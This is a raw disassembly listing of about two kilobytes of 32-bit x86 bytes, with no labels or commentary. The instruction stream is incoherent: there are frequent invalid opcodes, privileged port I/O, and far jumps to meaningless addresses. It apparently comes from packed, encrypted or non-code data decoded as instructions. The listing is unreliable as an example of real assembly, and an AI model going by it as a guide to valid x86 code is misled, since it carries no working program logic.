  418f6c:	adc    esp,DWORD PTR [eax+0x3f]
  418f6f:	jnp    0x418fde
  418f71:	or     esi,DWORD PTR [edx+0x4b]
  418f74:	ror    BYTE PTR [ebp-0x33],cl
  418f77:	sbb    BYTE PTR [edx+0x37],bh
  418f7a:	mov    edx,0x9e546f21
  418f7f:	cs out 0x4b,al
  418f82:	mov    al,0x75
  418f84:	clc    
  418f85:	mov    dh,0x8b
  418f87:	sbb    bl,BYTE PTR [ecx+0x6c]
  418f8a:	mov    WORD PTR [ebp-0x43],ss
  418f8d:	ds fcomip st,st(5)
  418f90:	cmc    
  418f91:	ja     0x418fee
  418f93:	jl     0x418fe6
  418f95:	mov    dh,0x3c
  418f97:	addr16 lahf 
  418f99:	pop    ss
  418f9a:	scas   al,BYTE PTR es:[edi]
  418f9b:	test   al,0xbf
  418f9d:	inc    esp
  418f9e:	cmp    eax,0x62c544b9
  418fa3:	jle    0x418fe0
  418fa5:	or     al,BYTE PTR [ecx+0x65d446ee]
  418fab:	outs   dx,BYTE PTR ds:[esi]
  418fac:	and    DWORD PTR [edx-0x4],esi
  418faf:	and    al,cl
  418fb1:	test   ecx,esp
  418fb3:	sbb    al,0x10
  418fb5:	mov    edx,DWORD PTR [edx]
  418fb7:	popa   
  418fb8:	fsubp  st(1),st
  418fba:	data16 or al,0x3a
  418fbd:	mov    cl,0x83
  418fbf:	loopne 0x418f65
  418fc1:	lock repnz and al,0x45
  418fc5:	lea    esp,[eax+0x6]
  418fc8:	js     0x419029
  418fca:	call   0xe200:0x32232fa8
  418fd1:	mov    ebp,0x18a515cf
  418fd6:	mov    esp,0x8eaad450
  418fdb:	shl    BYTE PTR [esi-0x3602d5a4],cl
  418fe1:	lods   al,BYTE PTR ds:[esi]
  418fe2:	rcl    DWORD PTR [eax+0x7f],1
  418fe5:	pop    es
  418fe6:	lea    edi,[esi]
  418fe8:	jmp    0x419020
  418fea:	mov    dh,BYTE PTR [ebx-0x29]
  418fed:	je     0x418fe7
  418fef:	bnd ret 0x7948
  418ff3:	stos   DWORD PTR es:[edi],eax
  418ff4:	push   esi
  418ff5:	(bad)  
  418ff6:	out    dx,al
  418ff7:	lahf   
  418ff8:	and    ch,BYTE PTR ds:0x151bb879
  418ffe:	xor    esp,DWORD PTR [esi-0x44c242ad]
  419004:	pop    ss
  419005:	mov    bh,0xe0
  419007:	gs mov ebp,0xd15d0c8a
  41900d:	and    BYTE PTR [eax+0x47],0x9c
  419011:	das    
  419012:	mov    WORD PTR [esi],gs
  419014:	pop    edx
  419015:	aam    0xb8
  419017:	pushf  
  419018:	mov    edx,0x77c796fe
  41901d:	rol    BYTE PTR [ebp-0x7eba51d7],1
  419023:	loope  0x419077
  419025:	stos   BYTE PTR es:[edi],al
  419026:	xchg   ecx,eax
  419027:	xchg   edx,eax
  419028:	stos   DWORD PTR es:[edi],eax
  419029:	lds    ebx,FWORD PTR [ebx+0x38cdae5c]
  41902f:	loope  0x419032
  419031:	and    eax,0x4ebaccfe
  419036:	test   eax,0xd6e337a0
  41903b:	jmp    0xdcf8:0xf9863c32
  419042:	fnstenvw [ecx+0x1590955e]
  419049:	test   al,0xea
  41904b:	xchg   edi,eax
  41904c:	fs ins DWORD PTR es:[edi],dx
  41904e:	cmc    
  41904f:	pop    esp
  419050:	mov    ecx,0x271a3346
  419055:	popa   
  419056:	aam    0x92
  419058:	call   0xe2f3:0x87180ba0
  41905f:	fs scas eax,DWORD PTR es:[edi]
  419061:	test   eax,0x1640383c
  419066:	aam    0x36
  419068:	jp     0x41902f
  41906a:	xlat   BYTE PTR ds:[ebx]
  41906b:	nop
  41906c:	or     cl,BYTE PTR [edi+eax*1+0x1]
  419070:	jmp    0xdb6a571d
  419075:	es add eax,0x3796cc03
  41907b:	aad    0xf7
  41907d:	loope  0x4190c7
  41907f:	iret   
  419080:	(bad)  
  419081:	leave  
  419082:	ja     0x419024
  419084:	imul   eax,DWORD PTR [ebp+0x14],0xfffffff6
  419088:	and    al,0x1c
  41908a:	aaa    
  41908b:	(bad)  
  41908d:	cs pop eax
  41908f:	and    BYTE PTR [edx+0x76],ch
  419092:	sub    BYTE PTR [esi+0x65],0x32
  419096:	or     DWORD PTR [esi],esi
  419098:	mov    ch,0xf0
  41909a:	test   BYTE PTR [edx+0x594e483c],al
  4190a0:	ret    0x4dec
  4190a3:	das    
  4190a4:	xchg   esi,eax
  4190a5:	xlat   BYTE PTR ds:[ebx]
  4190a6:	or     eax,0xe193ae74
  4190ab:	test   edx,0x3185a016
  4190b1:	mov    edx,0xa8582b86
  4190b6:	nop
  4190b7:	les    ebx,FWORD PTR [esi+0x165fdf]
  4190bd:	push   edx
  4190be:	nop
  4190bf:	mov    ecx,0x1f732880
  4190c4:	add    eax,0x2bdd41be
  4190c9:	push   ebp
  4190ca:	jecxz  0x419063
  4190cc:	retf   0xc992
  4190cf:	enter  0x7255,0xe6
  4190d3:	ror    BYTE PTR [eax+eax*2+0xc],1
  4190d7:	cmp    bl,BYTE PTR [ebx-0x14daaa7a]
  4190dd:	dec    edi
  4190de:	inc    ebp
  4190df:	dec    ecx
  4190e0:	out    dx,eax
  4190e1:	pop    ss
  4190e2:	ret    
  4190e3:	push   ebp
  4190e4:	inc    edx
  4190e5:	mov    ecx,edi
  4190e7:	jle    0x419108
  4190e9:	js     0x419153
  4190eb:	cmp    BYTE PTR [esi+0x4c],0x16
  4190ef:	sbb    eax,0xf89bb6c5
  4190f4:	daa    
  4190f5:	jg     0x4190cd
  4190f7:	pop    sp
  4190f9:	scas   al,BYTE PTR es:[edi]
  4190fa:	nop
  4190fb:	lods   al,BYTE PTR ds:[esi]
  4190fc:	gs add al,0xe0
  4190ff:	pop    esp
  419100:	mov    WORD PTR [ecx-0x3],gs
  419103:	lods   eax,DWORD PTR ds:[esi]
  419104:	and    edx,DWORD PTR [ebx-0x7207841f]
  41910a:	(bad)  
  41910b:	adc    bh,BYTE PTR [eax+ecx*4+0x69]
  41910f:	cmp    al,0xbc
  419111:	sbb    dh,BYTE PTR [edi-0xa]
  419114:	fcmovnb st,st(5)
  419116:	call   0xa31b578e
  41911b:	xchg   ebx,eax
  41911c:	test   BYTE PTR [ebp-0x29193bac],0x8f
  419123:	mov    bh,0x3f
  419125:	adc    edi,DWORD PTR [edi]
  419127:	pop    esi
  419129:	push   cs
  41912a:	jne    0x419187
  41912c:	mov    dh,0x94
  41912e:	push   es
  41912f:	sub    cl,dl
  419131:	out    0x8b,eax
  419133:	mov    esp,0x76718853
  419138:	jl     0x419159
  41913a:	inc    esp
  41913b:	fidivr WORD PTR [esi-0xc7eaf19]
  419141:	shl    cl,1
  419143:	test   BYTE PTR [edx],0xa7
  419146:	jbe    0x4191bd
  419148:	push   ebx
  419149:	scas   al,BYTE PTR es:[edi]
  41914a:	aaa    
  41914b:	aam    0x7a
  41914d:	xor    bl,dl
  41914f:	push   es
  419150:	adc    dl,BYTE PTR [ecx-0x74]
  419153:	aad    0x6e
  419155:	jns    0x41911e
  419157:	or     DWORD PTR [ebp+0x51e00eed],0x75
  41915e:	adc    DWORD PTR [esi],esp
  419160:	and    ebp,edx
  419162:	pusha  
  419163:	(bad)  
  419164:	call   0x4fcdb4d2
  419169:	arpl   WORD PTR [ebx],di
  41916b:	jne    0x41911b
  41916d:	or     DWORD PTR [ebp+0x31],edx
  419170:	mov    esp,0xbd8346de
  419175:	jecxz  0x419158
  419177:	push   ss
  419178:	jo     0x41917c
  41917a:	pushf  
  41917b:	sub    esi,DWORD PTR [ebp+0x10]
  41917e:	sub    ecx,DWORD PTR [edx-0x2257cb11]
  419184:	(bad)
  419187:	repnz inc esp
  419189:	pop    es
  41918a:	pusha  
  41918b:	in     al,dx
  41918c:	out    0x90,al
  41918e:	int3   
  41918f:	inc    ebx
  419190:	inc    esp
  419191:	outs   dx,DWORD PTR ds:[esi]
  419192:	lods   al,BYTE PTR ds:[esi]
  419193:	imul   ecx,DWORD PTR [eax+0x62],0x4e
  419197:	out    0x71,al
  419199:	and    eax,0xc07cfe6f
  41919e:	jns    0x4191f9
  4191a0:	loope  0x4191c7
  4191a2:	test   eax,0xf9bfd46d
  4191a7:	fimul  DWORD PTR [ebx+ebp*8-0x56]
  4191ab:	rcr    BYTE PTR [ebp-0x46769d8b],cl
  4191b1:	mov    edi,eax
  4191b3:	arpl   bx,si
  4191b5:	push   ecx
  4191b6:	cs hlt 
  4191b8:	or     DWORD PTR [esp+ecx*8+0x786f1270],ecx
  4191bf:	sub    ebp,edi
  4191c1:	mov    ds:0xadb2fb0,eax
  4191c6:	sub    al,0x4
  4191c8:	jp     0x4191da
  4191ca:	rcl    DWORD PTR [ecx],0xff
  4191cd:	jae    0x41919d
  4191cf:	stos   DWORD PTR es:[edi],eax
  4191d0:	mov    ebx,0xc86da8f8
  4191d5:	mov    edx,ebx
  4191d7:	frstor [esi-0x38]
  4191da:	rol    BYTE PTR [edx],1
  4191dc:	and    ah,BYTE PTR ds:0xb613da33
  4191e2:	mov    cl,0x7e
  4191e4:	arpl   bp,sp
  4191e6:	or     DWORD PTR [edx-0xe4148ae],ebp
  4191ec:	mov    DWORD PTR [ebx],ecx
  4191ee:	jne    0x4191be
  4191f0:	mov    bh,0x8b
  4191f2:	jl     0x4191d6
  4191f4:	cmp    cl,BYTE PTR [ebp+0xbcc84b6]
  4191fa:	stc    
  4191fb:	cmp    BYTE PTR [ebx],al
  4191fd:	clc    
  4191fe:	inc    ecx
  4191ff:	aas    
  419200:	sbb    eax,0xd4abe8ec
  419205:	jns    0x4191cd
  419207:	addr16 leave 
  419209:	gs cdq 
  41920b:	add    al,0xde
  41920d:	push   ds
  41920e:	jne    0x41925c
  419210:	aaa    
  419211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419212:	test   DWORD PTR [ebx],esi
  419214:	cli    
  419215:	or     DWORD PTR [edi-0x6],edx
  419218:	inc    esp
  419219:	or     ebp,DWORD PTR [ebx]
  41921b:	aam    0xcc
  41921d:	ret    0xddcb
  419220:	xchg   ebx,eax
  419221:	loope  0x419273
  419223:	mov    ecx,DWORD PTR [ebx+0x1a]
  419226:	call   0xafb567d
  41922b:	dec    ecx
  41922c:	and    edi,DWORD PTR [ebx-0x56797424]
  419232:	leave  
  419233:	pop    esi
  419234:	jge    0x41924b
  419236:	jmp    FWORD PTR [ecx]
  419238:	rcl    ch,cl
  41923a:	shr    DWORD PTR [edx+edi*2],0x73
  41923e:	data16 stos BYTE PTR es:[edi],al
  419240:	jne    0x4191ff
  419242:	lods   eax,DWORD PTR ds:[esi]
  419243:	dec    ebx
  419244:	and    DWORD PTR [ebx-0x313a796],ecx
  41924a:	mov    ecx,0x3d3a2ff2
  41924f:	or     BYTE PTR [edi+0x378626dd],bl
  419255:	cdq    
  419256:	inc    eax
  419257:	cmp    BYTE PTR [esi-0x7e60b268],ch
  41925d:	push   eax
  41925e:	sub    al,0x2
  419260:	fistp  QWORD PTR [esi+0x2b584496]
  419266:	cs mov dl,bh
  419269:	pushf  
  41926a:	pop    esp
  41926b:	jge    0x41929a
  41926d:	push   es
  41926e:	jne    0x4192e1
  419270:	xchg   edi,eax
  419271:	aas    
  419272:	dec    ebp
  419273:	dec    ebp
  419274:	dec    edi
  419275:	cmp    esp,ebx
  419277:	inc    esp
  419278:	xlat   BYTE PTR ds:[ebx]
  419279:	dec    BYTE PTR [ebp-0x3d8f55fe]
  41927f:	mov    al,ds:0xb4f0fa2e
  419284:	inc    ebp
  419285:	in     al,0xe6
  419287:	sbb    ebp,DWORD PTR [bx+si-0x5c]
  41928b:	call   0xd415:0xf1b36b04
  419292:	sub    BYTE PTR [eax],al
  419294:	or     BYTE PTR ds:0x2e942c4d,bh
  41929a:	ins    BYTE PTR es:[edi],dx
  41929b:	lock scas al,BYTE PTR es:[edi]
  41929d:	jmp    0x89ad:0x4ee9be14
  4192a4:	add    BYTE PTR [ebp-0x73],ch
  4192a7:	inc    ebx
  4192a8:	fidivr WORD PTR [edi]
  4192aa:	adc    dl,BYTE PTR [ecx-0x48]
  4192ad:	rcl    DWORD PTR [esi+0x25fb47bf],cl
  4192b3:	xlat   BYTE PTR ds:[ebx]
  4192b4:	pushf  
  4192b5:	test   al,0x95
  4192b7:	adc    cl,dl
  4192b9:	dec    edi
  4192ba:	or     DWORD PTR [esi],0xf7ed88b9
  4192c0:	adc    esi,DWORD PTR [edx+0x4f]
  4192c3:	aam    0x6e
  4192c5:	pop    eax
  4192c6:	push   esp
  4192c7:	inc    ebp
  4192c8:	stc    
  4192c9:	push   ecx
  4192ca:	push   ebx
  4192cb:	dec    edx
  4192cc:	pop    ds
  4192cd:	nop
  4192ce:	pop    eax
  4192cf:	xor    BYTE PTR [ebp+edi*2-0x5e],bh
  4192d3:	outs   dx,BYTE PTR ds:[esi]
  4192d4:	xchg   ecx,eax
  4192d5:	mov    ds,WORD PTR [ecx+0x6cf76f5f]
  4192db:	popa   
  4192dc:	out    dx,eax
  4192dd:	jns    0x419292
  4192df:	inc    edi
  4192e0:	xor    DWORD PTR [ebx+eiz*8+0x13da5c47],esi
  4192e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192e8:	inc    esp
  4192e9:	xor    edx,DWORD PTR ds:0x6d55a776
  4192ef:	fsub   QWORD PTR [eax+eax*8-0x5d]
  4192f3:	xor    DWORD PTR [ebx],ebx
  4192f5:	mov    al,ds:0x9df34ee1
  4192fa:	mov    eax,ds:0xe57068e2
  4192ff:	xor    al,0xb3
  419301:	xchg   BYTE PTR [ebx],al
  419303:	mov    edi,0xc5120af3
  419308:	sti    
  419309:	stos   BYTE PTR es:[edi],al
  41930a:	paddsb mm7,QWORD PTR [ecx+0x39c81f8e]
  419311:	xchg   edi,eax
  419312:	adc    cl,BYTE PTR [esp+edi*4+0x27]
  419316:	dec    esi
  419317:	ss jne 0x419399
  41931a:	popa   
  41931b:	mov    edx,0xed5fa09
  419320:	js     0x4192e7
  419322:	popf   
  419323:	retf   
  419324:	xchg   edx,eax
  419325:	pop    ecx
  419326:	jae    0x419338
  419328:	push   ebx
  419329:	jo     0x419313
  41932b:	sbb    eax,0x29874dab
  419330:	lds    ecx,FWORD PTR [ebx-0x58db40c]
  419336:	mov    dh,BYTE PTR [ebp-0x7a]
  419339:	xchg   ecx,eax
  41933a:	mov    edi,0x3f6807eb
  41933f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419340:	aas    
  419341:	pop    es
  419342:	push   0x75f490fd
  419347:	ja     0x419357
  419349:	mov    edi,eax
  41934b:	push   esi
  41934c:	mov    eax,0x7c7400f3
  419351:	push   ecx
  419352:	jecxz  0x419387
  419354:	pop    esp
  419355:	adc    eax,0xd7bc9966
  41935a:	add    DWORD PTR [ebp-0x65ec204f],ecx
  419360:	dec    edx
  419361:	sar    DWORD PTR [eax],cl
  419363:	sub    DWORD PTR [edx+0x4f],edi
  419366:	ja     0x4192ee
  419368:	push   ds
  419369:	imul   eax,DWORD PTR [edx-0x448edf71],0xfffffff4
  419370:	icebp  
  419371:	sbb    ebx,DWORD PTR [esi]
  419373:	je     0x4193d5
  419375:	mov    eax,edx
  419377:	(bad)  
  419378:	lahf   
  419379:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41937b:	sbb    eax,0xa944f64
  419380:	shr    BYTE PTR [ebx+esi*4-0x2ec1cad1],1
  419387:	pop    esi
  419388:	inc    esp
  419389:	inc    ebp
  41938a:	ja     0x4193f3
  41938c:	mov    eax,ds:0x5042a358
  419391:	dec    BYTE PTR [edx]
  419393:	and    eax,0xd77547c9
  419398:	mov    al,ds:0x2ad9aeb7
  41939d:	das    
  41939e:	(bad)  
  41939f:	mov    ah,0xd7
  4193a1:	addr16 stc 
  4193a3:	stc    
  4193a4:	gs xchg esi,eax
  4193a6:	into   
  4193a7:	fwait
  4193a8:	stc    
  4193a9:	in     eax,0x63
  4193ab:	cld    
  4193ac:	mov    ecx,0x215295a8
  4193b1:	sbb    al,BYTE PTR [ecx]
  4193b3:	fdivr  QWORD PTR ds:0xcdc75db2
  4193b9:	mov    ebx,0x6706ed1a
  4193be:	jno    0x419382
  4193c0:	nop
  4193c1:	aam    0xf4
  4193c3:	cmp    BYTE PTR [esp+ecx*1-0x55383a23],ch
  4193ca:	fcomip st,st(0)
  4193cc:	pop    ds
  4193cd:	sbb    cl,ah
  4193cf:	pop    ebx
  4193d0:	sub    eax,0x7ac21485
  4193d5:	inc    edx
  4193d6:	enter  0x8815,0xc5
  4193da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193db:	jnp    0x419448
  4193dd:	sub    esp,DWORD PTR [edx]
  4193df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193e0:	jo     0x419437
  4193e2:	(bad)  
  4193e3:	push   0xffffffc6
  4193e5:	inc    edi
  4193e6:	in     eax,0x8d
  4193e8:	cwde   
  4193e9:	(bad)  
  4193ea:	cdq    
  4193eb:	dec    esp
  4193ec:	(bad)  
  4193ed:	pop    ebp
  4193ee:	jne    0x41940e
  4193f0:	inc    edx
  4193f1:	call   0xfeba:0x6fe3ed7f
  4193f8:	push   edx
  4193f9:	fwait
  4193fa:	aas    
  4193fb:	jmp    0x4f8067dc
  419400:	test   ecx,0x35f5c639
  419406:	dec    esi
  419407:	mov    dh,0xe8
  419409:	(bad)  
  41940a:	mov    cl,0xe0
  41940c:	mov    ah,0x5f
  41940e:	and    al,0xa7
  419410:	mov    esp,esp
  419412:	pop    ss
  419413:	sub    DWORD PTR [ecx],ebp
  419415:	pop    edx
  419416:	imul   ebp,DWORD PTR [edi+0x666c1946],0x179e9304
  419420:	outs   dx,BYTE PTR ds:[esi]
  419421:	aaa    
  419422:	test   al,0x3d
  419424:	inc    edx
  419425:	pushf  
  419426:	add    dh,dh
  419428:	sbb    BYTE PTR [edi],ah
  41942a:	imul   edi,DWORD PTR [ecx-0x9],0xfffffff3
  41942e:	sbb    bh,al
  419430:	push   ds
  419431:	mov    cl,0x74
  419433:	sbb    DWORD PTR [eax],ecx
  419435:	prefetch (bad)
  419436:	or     eax,0x13d4cce1
  41943b:	stos   DWORD PTR es:[edi],eax
  41943c:	repz cmp DWORD PTR [eax+0x5b],eax
  419440:	mov    ah,0x9f
  419442:	pop    ss
  419443:	imul   esp,DWORD PTR [ecx],0x1270ce2e
  419449:	fld    QWORD PTR [ecx]
  41944b:	jbe    0x4193f4
  41944d:	push   0xe6c6ad4c
  419452:	stos   BYTE PTR es:[edi],al
  419453:	and    BYTE PTR [eax-0x24],ch
  419456:	(bad)  
  419458:	stos   BYTE PTR es:[edi],al
  419459:	sahf   
  41945a:	xor    al,0x80
  41945c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41945d:	cmp    BYTE PTR [ebp+0x50],al
  419460:	bound  esi,QWORD PTR [eax+ecx*2-0x52]
  419464:	inc    esi
  419465:	sbb    ecx,ebx
  419467:	adc    al,0xc3
  419469:	fnstcw WORD PTR [edi-0x71ad6ae9]
  41946f:	test   eax,0xbee21720
  419474:	js     0x41946c
  419476:	sub    eax,0xb87b7aaf
  41947b:	aad    0xb3
  41947d:	push   0x4cdddbea
  419482:	hlt    
  419483:	add    al,0xb3
  419485:	or     eax,0xad092804
  41948a:	add    eax,0xccc491b0
  41948f:	cmp    eax,0x65f51548
  419494:	rcl    DWORD PTR [eax+ecx*4],1
  419497:	or     ah,BYTE PTR [edx+0x601f9043]
  41949d:	lock and esp,DWORD PTR [ebx+0x62]
  4194a1:	add    BYTE PTR [ebp+0x680fd923],bh
  4194a7:	cwde   
  4194a8:	mov    esp,DWORD PTR [ecx-0xb2865ef]
  4194ae:	xchg   esp,eax
  4194af:	or     eax,0x696bfe15
  4194b4:	lahf   
  4194b5:	adc    DWORD PTR [edi+0x49],ecx
  4194b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194b9:	and    ecx,DWORD PTR [esi-0x2c]
  4194bc:	enter  0x400f,0xe4
  4194c0:	xor    BYTE PTR [esi-0x4e964a7b],dh
  4194c6:	retf   0x9800
  4194c9:	push   edi
  4194ca:	cmp    DWORD PTR [ecx+0x5b],eax
  4194cd:	xchg   ecx,ebp
  4194cf:	cmp    DWORD PTR [ebx+0x25],ebp
  4194d2:	pop    eax
  4194d3:	or     DWORD PTR [edi-0x80],0xf9aebd43
  4194da:	icebp  
  4194db:	imul   ebp
  4194dd:	pop    esi
  4194de:	mov    DWORD PTR [ecx+ebp*1+0x17],ebx
  4194e2:	mov    eax,ds:0xfaba9c38
  4194e7:	xlat   BYTE PTR ds:[ebx]
  4194e8:	xor    al,BYTE PTR [ebx-0x2b148d0a]
  4194ee:	fild   QWORD PTR [eax+0x5d]
  4194f1:	addr16 push edx
  4194f3:	cli    
  4194f4:	fistp  DWORD PTR [esi-0x6d]
  4194f7:	(bad)  
  4194f8:	call   0x3b90:0x9a78e0bc
  4194ff:	add    eax,0xe41117a8
  419504:	fnsave [edi+0x2]
  419507:	(bad)  
  419508:	pop    eax
  419509:	cmp    BYTE PTR [esi+0x54dac30d],al
  41950f:	pop    ebp
  419510:	add    bl,BYTE PTR [eax-0x75a6d437]
  419516:	xchg   edi,eax
  419517:	push   0x4dd6b426
  41951c:	mov    ebx,0x94ca5321
  419521:	lock add al,BYTE PTR [eax-0x2d051b02]
  419528:	in     eax,dx
  419529:	or     DWORD PTR [edi+ecx*8-0x71],edx
  41952d:	adc    BYTE PTR [ebx-0x18],bh
  419530:	and    edx,ebx
  419532:	dec    ecx
  419533:	fdiv   DWORD PTR [edx-0x45e366d5]
  419539:	xor    eax,0xd69c69aa
  41953e:	cmp    al,0xa0
  419540:	and    eax,0x4afbde06
  419545:	js     0x41959d
  419547:	call   0xc728625f
  41954c:	xchg   ebp,eax
  41954d:	out    dx,eax
  41954e:	clc    
  41954f:	in     al,dx
  419550:	test   al,0x9d
  419552:	nop
  419553:	jae    0x419587
  419555:	dec    ebp
  419556:	cmp    cl,BYTE PTR [edi-0x78573da2]
  41955c:	inc    ebp
  41955d:	mov    ecx,0x966ede83
  419562:	in     al,dx
  419563:	inc    ecx
  419564:	test   dl,cl
  419566:	dec    edi
  419567:	ja     0x41955c
  419569:	jne    0x419574
  41956b:	fsubrp st(6),st
  41956d:	int3   
  41956e:	jg     0x419599
  419570:	stos   BYTE PTR es:[edi],al
  419571:	dec    ecx
  419572:	loopne 0x419511
  419574:	jno    0x419577
  419576:	add    al,0xa8
  419578:	adc    DWORD PTR [eax+eax*2+0x45],0x8da3d26b
  419580:	pop    ebx
  419581:	dec    edi
  419582:	(bad)  
  419583:	pop    ecx
  419584:	ret    
  419585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419586:	xchg   ecx,eax
  419587:	and    edx,edx
  419589:	inc    cl
  41958b:	fisttp DWORD PTR [esi-0x7f]
  41958e:	xchg   edi,eax
  41958f:	sbb    DWORD PTR [edi+0x1273caeb],edi
  419595:	jle    0x4195bb
  419597:	mov    ebp,0x31b14e5f
  41959c:	xchg   DWORD PTR [edx],esp
  41959e:	and    eax,0xc3b9523f
  4195a3:	aad    0x83
  4195a5:	and    eax,esp
  4195a7:	xchg   edx,eax
  4195a8:	jmp    0x8b6918fb
  4195ad:	lods   al,BYTE PTR ds:[esi]
  4195ae:	rcr    DWORD PTR [ecx],cl
  4195b0:	jp     0x41962c
  4195b2:	fcom   DWORD PTR [ecx+0x52]
  4195b5:	mov    bl,0xdb
  4195b7:	pop    ebx
  4195b8:	mov    dh,0x40
  4195ba:	mov    bh,0xe5
  4195bc:	out    0xef,eax
  4195be:	add    al,0x42
  4195c0:	xchg   esi,eax
  4195c1:	dec    DWORD PTR [edi]
  4195c3:	mov    BYTE PTR [esi-0x15],al
  4195c6:	pop    esi
  4195c7:	mov    fs:0xcea13194,eax
  4195cd:	xchg   ebp,eax
  4195ce:	imul   ecx,DWORD PTR [esi+edi*2+0x5d],0xd7e49e39
  4195d6:	rcr    DWORD PTR [ebx-0x3c9bc383],0x24
  4195dd:	rcl    bh,1
  4195df:	xor    ebp,DWORD PTR ds:0xfae304af
  4195e5:	ins    BYTE PTR es:[edi],dx
  4195e6:	xchg   ebp,eax
  4195e7:	inc    edi
  4195e8:	cmp    al,ah
  4195ea:	test   DWORD PTR [ebx],eax
  4195ec:	or     DWORD PTR [ebx-0x7a],edx
  4195ef:	add    ch,BYTE PTR [eax-0x2345713c]
  4195f5:	add    al,0x14
  4195f7:	push   es
  4195f8:	jmp    0xfedce749
  4195fd:	mov    BYTE PTR [ebp-0x79],ch
  419600:	(bad)  
  419601:	pushf  
  419602:	push   ebp
  419603:	inc    ecx
  419604:	adc    DWORD PTR [ebx-0x5c7f8007],0xffffff8c
  41960b:	in     eax,0x47
  41960d:	push   ss
  41960e:	in     eax,0x6e
  419610:	cli    
  419611:	test   eax,0x7783aef9
  419616:	(bad)  
  419617:	div    DWORD PTR ds:0x58bcbab
  41961d:	push   es
  41961e:	and    al,0x1f
  419620:	cwde   
  419621:	adc    cl,BYTE PTR [ebx]
  419623:	mov    eax,ds:0x87eab576
  419628:	cdq    
  419629:	call   0x23a8d363
  41962e:	js     0x41960a
  419630:	adc    esi,DWORD PTR [edx-0x3abca5eb]
  419636:	push   es
  419637:	ins    BYTE PTR es:[edi],dx
  419638:	into   
  419639:	dec    ecx
  41963a:	data16 jo 0x419657
  41963d:	test   DWORD PTR [esi-0x8c33c01],ecx
  419643:	add    DWORD PTR [edx-0x308ec61e],0xaf93e99e
  41964d:	or     eax,0x5bc3e11e
  419652:	xchg   BYTE PTR [ecx-0x1fd25007],ah
  419658:	jg     0x419653
  41965a:	fmulp  st(0),st
  41965c:	xlat   BYTE PTR ds:[ebx]
  41965d:	jo     0x41961f
  41965f:	sbb    DWORD PTR [edi-0x7874e92c],eax
  419665:	cmc    
  419666:	jno    0x41964e
  419668:	fwait
  419669:	push   es
  41966a:	add    eax,0x637c54db
  41966f:	xor    al,0x91
  419671:	loope  0x419658
  419673:	inc    ebx
  419674:	sub    DWORD PTR [edx-0x25e22e18],esp
  41967a:	push   cs
  41967b:	jb     0x4196ec
  41967d:	mov    al,0xac
  41967f:	mov    ds:0xb655b8c7,eax
  419684:	mov    ebx,0x8a4cd76e
  419689:	mov    dl,0xb3
  41968b:	jge    0x41966c
  41968d:	jb     0x4196e9
  41968f:	lods   eax,DWORD PTR ds:[esi]
  419690:	retf   
  419691:	shl    al,1
  419693:	or     edx,DWORD PTR [ebx]
  419695:	cmp    al,0x90
  419697:	or     eax,0xc8dc8a3d
  41969c:	xchg   esp,eax
  41969d:	jno    0x4196a2
  41969f:	dec    eax
  4196a0:	add    ah,0xed
  4196a3:	(bad)  
  4196a4:	jbe    0x4196a0
  4196a6:	fsub   QWORD PTR [eax-0x4aab97dd]
  4196ac:	fsub   QWORD PTR [ecx+edi*1]
  4196af:	xchg   ebp,eax
  4196b0:	enter  0xc66b,0x9d
  4196b4:	xchg   ebx,eax
  4196b5:	fcomi  st,st(1)
  4196b7:	jmp    ebp
  4196b9:	push   0xc4b84df7
  4196be:	sub    eax,0xd866cc05
  4196c3:	leave  
  4196c4:	rcr    ebp,cl
  4196c6:	sbb    ecx,edi
  4196c8:	or     edx,edx
  4196ca:	add    eax,0x101656e9
  4196cf:	sbb    edx,DWORD PTR [eax-0x162b129e]
  4196d5:	rol    BYTE PTR [ecx+0x14f9e9f5],cl
  4196db:	or     al,0xe5
  4196dd:	sub    dl,BYTE PTR [eax-0xd4baf0b]
  4196e3:	mov    eax,0x6d8fe348
  4196e8:	fisttp DWORD PTR [ebx-0x6c]
  4196eb:	mov    ecx,0x102f9065
  4196f0:	frstor [edx+0x2c]
  4196f3:	push   ebx
  4196f4:	mov    ebx,0x6dcb689a
  4196f9:	inc    ebx
  4196fa:	mov    ebp,0x99e2715f
  4196ff:	and    dh,BYTE PTR [edx-0x3b1374be]
  419705:	call   0xe5a2b07c
  41970a:	push   eax
  41970b:	adc    ebx,esi
  41970d:	cmp    dl,BYTE PTR [ebx]
  41970f:	(bad)  
  419710:	jns    0x419776
  419712:	cmp    eax,0x5e93e925
  419717:	out    dx,al
  419718:	xor    DWORD PTR [eax+0x1d],eax
  41971b:	inc    edi
  41971c:	js     0x4196af
  41971e:	fs (bad) 
  419720:	aad    0xeb
  419722:	or     DWORD PTR [eax+esi*8+0x1e],0x3be557da
  41972a:	fsub   DWORD PTR [ecx]
  41972c:	leave  
  41972d:	jb     0x4196f0
  41972f:	mov    bh,0xc
  419731:	imul   ebx,DWORD PTR [ebp+0x19ddd180],0x20f6aee6
  41973b:	pop    ebx
  41973c:	arpl   WORD PTR [edi+0x64],ax
  41973f:	mov    edx,0x7eb2ac2e
  419744:	fisttp DWORD PTR [edi]
  419746:	sahf   
  419747:	or     eax,0xe6e2613a
  41974c:	xchg   ebp,eax
  41974d:	loop   0x419787
  41974f:	sub    al,0x2
  419751:	jg     0x4197bf
  419753:	enter  0xf30e,0xbe
  419757:	in     eax,dx
  419758:	in     eax,dx
  419759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41975a:	or     al,0xc9
  41975c:	adc    BYTE PTR [eax+ebp*4-0x7a],bh
  419760:	shl    cl,cl
  419762:	mov    ebx,0xf5061b02
  419767:	xor    eax,0xc263343f
  41976c:	mov    bl,0xba
  41976e:	lods   al,BYTE PTR ds:[esi]
  41976f:	or     edi,DWORD PTR [ebx-0x59]
  419772:	rcr    DWORD PTR [esi+0x1ce3ce9],0x3b
  419779:	and    cl,BYTE PTR [ebx+ecx*8-0x7d]
  41977d:	adc    DWORD PTR [eax],ebx
  41977f:	pop    ecx
  419780:	mov    ebp,0x9fd50701
  419785:	aaa    
  419786:	cmc    
  419787:	shl    BYTE PTR [eax],1
